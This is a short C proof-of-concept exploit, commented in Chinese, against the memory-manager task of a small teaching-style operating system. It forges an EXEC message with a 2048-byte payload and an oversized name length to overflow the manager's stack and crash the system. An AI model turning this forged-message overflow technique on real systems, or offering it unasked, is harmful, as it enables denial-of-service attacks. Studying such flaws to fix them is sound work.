#include "type.h"
#include "stdio.h"
#include "const.h"
#include "string.h"
/**
 * POC: MM 系统任务栈缓冲区溢出攻击 (伪造消息)
 * 
 * 原理：
 * 1. 伪造一个 EXEC 消息发送给 MM (内存管理器)。
 * 2. 在消息中指定一个超长的文件名长度 (NAME_LEN)。
 * 3. MM 的 do_exec 函数在处理时，没有检查长度直接将数据拷贝到内核栈上的局部变量数组中。
 * 4. 这会导致 MM 的栈被覆盖（包括返回地址），引发系统崩溃。
 */
void poc_mm_stack_overflow() {
    MESSAGE msg;
    
    // 构造 Payload: 2048 字节的 'A'
    // MM 内部通常使用 char pathname[MAX_PATH] (128字节)
    char malicious_payload[2048]; 
    
    memset(malicious_payload, 'A', sizeof(malicious_payload));
    malicious_payload[sizeof(malicious_payload) - 1] = '\0';

    printf("\n");
    printf("[*] Starting Attack: Fake Message Stack Overflow\n");
    printf("[*] Target: TASK_MM (PID: %d)\n", TASK_MM);
    printf("[*] Payload Size: %d bytes\n", sizeof(malicious_payload));

    // 构造恶意的 EXEC 消息
    msg.type = EXEC;
    msg.NAME_LEN = sizeof(malicious_payload); // 关键点：告诉 MM 我们要拷贝这么多数据
    msg.PATHNAME = malicious_payload;         // 源数据地址
    msg.BUF_LEN = 0;

    printf("[*] Sending forged EXEC message...\n");
    
    // 发送消息触发漏洞
    send_recv(BOTH, TASK_MM, &msg);

    // 如果系统没崩，说明攻击失败
    printf("[!] System is still alive. Attack failed.\n");
}

int main() {
    poc_mm_stack_overflow();
    while(1) {}
    return 0;
}